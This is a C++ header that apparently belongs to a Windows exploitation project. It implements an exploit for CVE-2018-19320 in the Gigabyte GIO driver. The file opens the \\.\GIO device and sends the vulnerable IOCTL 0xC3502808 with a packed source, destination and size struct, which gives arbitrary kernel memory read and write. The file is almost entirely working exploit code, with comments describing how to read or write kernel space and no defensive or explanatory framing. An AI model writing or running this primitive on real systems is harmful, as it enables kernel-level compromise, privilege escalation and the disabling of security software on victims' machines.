#pragma once
#include <optional>
#include <format>
#include <array>
#include "../common/error.hpp"
#include "../common/handle.hpp"

namespace driver {

// Gigabyte driver vulnerable to CVE-2018-19320. The vulnerability allows
// reading and writing to kernel memory.
constexpr DWORD ioctl = 0xC3502808; // Vulnerable IOCTL Code

// Exploit CVE-2018-19320 using the memcpy like feature exposed by the
// driver.
std::optional<common::windows_error>
memcpy(ULONG_PTR dst, ULONG_PTR src, size_t size);

// Exploit CVE-2018-19320 using the memcpy like feature exposed by the driver. 
// This "feature" can be used to read or write to kernel space. To write,
// specify a destination address in kernel space. To read specify a source
// address in kernel space.
// 
// Original PoC: https://seclists.org/fulldisclosure/2018/Dec/39
// 
// @dst destination memory address which can be in kernel space
// @src source memory address which can be in kernel space
// @size number of bytes being written to the destination address
std::optional<common::windows_error>
memcpy(ULONG_PTR dst, ULONG_PTR src, size_t count) {
    common::unique_handle device = ::CreateFileW(
        L"\\\\.\\GIO",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
	if (!device) {
		return common::get_last_error(
			std::format("Could not get handle to device \\\\.\\GIO")
		);
	}

#pragma pack(push, 1)
    struct ioctl_buf {
        ULONG_PTR  d;
        ULONG_PTR  s;
        size_t     c;
    };
#pragma pack(pop)

	ioctl_buf input{ dst, src, count };
	std::array<std::byte, 0x30> output{};
	DWORD size{};
	if (!::DeviceIoControl(
		device.get(),                    // Device handle
		ioctl,                           // IOCTL code
		&input,                            // Pointer to payload struct
		sizeof(input),                     // Size of the input (in bytes)
		output.data(),                     // Pointer to the buffer where output is received
		static_cast<DWORD>(output.size()), // Size of the output (in bytes)
		&size,
		nullptr
	)) {
		return common::get_last_error(
			std::format(
				"Could not write {} to {} using IOCTL {}",
				input.s,
				input.d,
				ioctl
        ));
	}

	return std::nullopt;
}

} // namespace driver
